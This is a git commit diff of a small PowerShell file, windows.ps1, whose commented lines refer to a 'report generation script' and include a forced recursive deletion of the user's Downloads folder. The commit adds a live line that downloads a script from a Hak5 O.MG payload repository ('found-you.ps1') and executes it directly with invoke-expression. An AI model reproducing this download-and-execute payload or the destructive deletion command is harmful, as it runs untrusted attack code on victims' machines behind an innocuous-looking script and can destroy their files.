09b3603e630c9b03bce75d3e4ac60e3eae274aa3
Miguel Santos <miguelsantos029@gmail.com>
2024-12-10 23:29:38 +0000

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -2,4 +2,5 @@
 #$wshell = New-Object -ComObject Wscript.Shell
 #$wshell.Popup("The report generation script is executed!d")
 #Remove-Item -Path "$env:USERPROFILE\Downloads\*" -Recurse -Force
+$pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1; invoke-expression $pl
 exit
